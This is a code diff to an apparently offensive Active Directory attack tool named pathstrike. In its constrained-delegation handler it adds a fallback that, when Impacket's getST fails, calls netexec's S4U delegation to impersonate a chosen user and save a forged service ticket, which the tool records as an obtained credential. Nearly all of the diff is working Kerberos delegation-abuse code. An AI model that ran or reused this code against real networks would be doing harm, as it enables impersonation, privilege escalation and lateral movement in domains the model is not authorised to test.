@@ -20,6 +20,7 @@ from pathstrike.models import (
 )
 from pathstrike.tools import bloodyad_wrapper as bloody
 from pathstrike.tools import impacket_wrapper as impacket
+from pathstrike.tools import netexec_wrapper as nxc
 
 # userAccountControl flag: account is trusted for protocol-transition S4U.
 _TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000
@@ -139,7 +140,40 @@ class AllowedToDelegateHandler(BaseEdgeHandler):
             nt_hash=nt_hash, dc_ip=dc_ip,
         )
         if not result["success"]:
-            return False, f"S4U2Proxy failed: {result.get('error', 'unknown')}", []
+            # Fallback: netexec's native S4U (--delegate). Same S4U2Self+
+            # S4U2Proxy primitive via a different implementation — covers cases
+            # where Impacket's getST chokes on the ticket/auth handling.
+            self.logger.info(
+                "Impacket getST failed (%s); falling back to netexec --delegate",
+                result.get("error", "unknown"),
+            )
+            st_path = f"{impersonate_user}@{spn.replace('/', '_')}.ccache"
+            nxc_result = await nxc.s4u_delegate(
+                target_fqdn,
+                self._get_nxc_auth_args(principal),
+                impersonate=impersonate_user,
+                spn=spn,
+                generate_st=st_path,
+            )
+            if not nxc_result.get("success"):
+                return (
+                    False,
+                    f"S4U2Proxy failed: {result.get('error', 'unknown')} "
+                    f"(netexec --delegate fallback: {nxc_result.get('error', 'unknown')})",
+                    [],
+                )
+            return (
+                True,
+                f"Obtained service ticket for {impersonate_user} to {spn} "
+                "(netexec --delegate fallback)",
+                [Credential(
+                    cred_type=CredentialType.ccache, value=st_path,
+                    username=impersonate_user, domain=domain,
+                    obtained_from=(
+                        f"netexec S4U via constrained delegation ({principal} -> {spn})"
+                    ),
+                )],
+            )
 
         ccache = _saved_ccache(result) or f"{impersonate_user}@{spn.replace('/', '_')}.ccache"
         return (
